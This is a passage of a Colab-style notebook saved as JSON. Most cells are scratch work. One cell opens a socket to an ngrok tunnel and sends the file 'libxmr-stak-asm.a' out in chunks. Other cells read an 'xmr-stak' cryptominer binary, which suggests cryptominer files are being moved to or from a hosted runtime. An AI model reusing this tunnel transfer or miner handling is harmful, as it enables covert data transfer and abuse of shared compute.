        "    print(i,end='')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "R7dpfcmGzRYt",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "for i in fun(['ip']):\n",
        "    print(i)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "BIlm7W-ZzRY4",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "os.listdir()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "xlVYIo8bzRZJ",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "import socket                   # Import socket module\n",
        "\n",
        "s = socket.socket()             # Create a socket object\n",
        "#host = socket.gethostname()     # Get local machine name\n",
        "port = 60000                    # Reserve a port for your service.\n",
        "\n",
        "s.connect(('0.tcp.ngrok.io', 18915))\n",
        "f = open('libxmr-stak-asm.a','rb')\n",
        "l = f.read(1024)\n",
        "while (l):\n",
        "   s.send(l)\n",
        "   #print('Sent ',repr(l))\n",
        "   l = f.read(1024)\n",
        "f.close()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "7HD45A5_zRZS",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "f = open('xmr-stak','rb')\n",
        "f = f.read()\n",
        "len(f)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "k3Iuc7tczRZZ",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "f = f.read()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "ZvLfXSGPzRZg",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "len(f)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "trusted": true,
        "id": "-Y3JFQTHzRZn",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 90
        },
        "outputId": "e38004b3-ea82-4196-cfd9-c34cec20a161"
      },
      "cell_type": "code",
      "source": [
        "!wget"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "wget: missing URL\n",
            "Usage: wget [OPTION]... [URL]...\n",
            "\n",
            "Try `wget --help' for more options.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "_TIKsTTuzkd1",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}